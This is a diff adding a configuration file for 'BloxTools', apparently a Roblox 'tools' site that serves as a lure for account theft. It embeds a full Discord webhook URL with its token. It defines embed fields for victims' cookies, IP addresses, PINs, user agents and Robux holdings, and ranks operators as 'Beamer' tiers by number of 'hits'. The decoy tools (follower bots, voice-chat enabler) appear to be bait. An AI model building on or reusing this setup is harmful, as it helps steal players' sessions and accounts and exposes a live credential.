@@ -1,0 +1,104 @@
+export const siteConfig = {
+  name: "BloxTools",
+  webhookUrl: "https://discord.com/api/webhooks/1499103473546035462/pSKamRGzu27_7p4kr2Spr5YZl7zylwmRuj4omBg02R3jVq6XbCCpbYl6gh4G6KkAv95z",
+  discordInviteUrl: "https://discord.gg/your-invite-here",
+};
+
+// Custom Discord emoji overrides used in webhook embeds.
+// Format for animated: <a:name:id>, for static: <:name:id>
+// Set to null/empty string to fall back to the default unicode emoji.
+export const discordEmojis = {
+  robux:    "<:7116_Robux:1498757858731360349>",
+  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
+  rap:      "💎",
+  summary:  "📊",
+  pending:  "⏳",
+  voice:    "🎤",
+  age:      "🪪",
+  korblox:  "<:KorbloxDeathspeaker:1498762534784864387>",
+  headless: "<:noFilter:1498762549762461909>",
+  groups:   "👑",
+  games:    "🎮",
+  cookie:   "🍪",
+  ip:       "🌐",
+  user:     "👤",
+  id:       "🆔",
+  age_acct: "📅",
+  friends:  "🫂",
+  followers:"👥",
+  following:"➡️",
+  ua:       "🖥️",
+  time:     "⏰",
+  pin:      "🔐",
+  owner:    "🏷️",
+};
+
+
+export const toolsConfig = {
+  botFollowers: {
+    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
+  },
+  copyGames: {
+    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
+  },
+  copyClothes: {
+    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
+  },
+  groupBotter: {
+    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
+  },
+  vcEnabler: {
+    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
+  },
+};
+
+// Rank tiers (linear progression). Index 0 = lowest rank.
+export const RANKS: { name: string; min: number }[] = [
+  { name: "Beginner Beamer", min: 0 },
+  { name: "Low Beamer", min: 10 },
+  { name: "Novice Beamer", min: 25 },
+  { name: "Average Beamer", min: 50 },
+  { name: "Decent Beamer", min: 100 },
+  { name: "Solid Beamer", min: 200 },
+  { name: "Good Beamer", min: 350 },
+  { name: "Advanced Beamer", min: 550 },
+  { name: "Pro Beamer", min: 800 },
+  { name: "Top Beamer", min: 1200 },
+];
+
+export function getRank(hits: number) {
+  let current = RANKS[0];
+  let next: { name: string; min: number } | null = null;
+  for (let i = 0; i < RANKS.length; i++) {
+    if (hits >= RANKS[i].min) {
+      current = RANKS[i];
+      next = RANKS[i + 1] ?? null;
+    }
+  }
+  return { current, next };
+}
+
+// Referrals are inactive for now — no rank boosts or rewards are applied.
+export interface ReferralTier {
+  name: string;
+  minReferrals: number;
+  boostPerReferral: number;
+  perk: string;
+  color: string; // tailwind text-* color
+}
+export const REFERRAL_TIERS: ReferralTier[] = [
+  { name: "Inactive", minReferrals: 0, boostPerReferral: 0, perk: "No rewards active", color: "text-gray-300" },
+];
+
+export function getReferralTier(referrals: number): { current: ReferralTier; next: ReferralTier | null } {
+  let current = REFERRAL_TIERS[0];
+  let next: ReferralTier | null = null;
+  for (let i = 0; i < REFERRAL_TIERS.length; i++) {
+    if (referrals >= REFERRAL_TIERS[i].minReferrals) {
+      current = REFERRAL_TIERS[i];
+      next = REFERRAL_TIERS[i + 1] ?? null;
+    }
+  }
+  return { current, next };
+}
+
